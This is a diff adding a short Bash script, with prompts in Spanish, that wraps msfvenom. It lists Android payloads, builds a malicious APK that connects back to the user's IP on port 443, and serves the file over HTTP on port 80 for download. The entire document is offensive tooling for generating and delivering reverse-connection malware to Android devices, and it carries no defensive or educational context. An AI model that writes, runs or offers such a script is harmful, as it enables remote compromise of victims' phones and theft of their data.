@@ -1,0 +1,16 @@
+#!/bin/bash 
+echo "que payload quieres buscar, android"
+read payl
+payl=$payl
+msfvenom -l payload | grep $payl
+echo "que payload quieres utilizar, android"
+read pay
+echo "que nombre le quieres poner a tu archivo "
+read nombre
+echo "cual es tu ip"
+read ip
+ip=$ip
+nombre=$nombre
+pay=$pay
+
+msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo "parece que alguna de tu respuesta no es correcta"
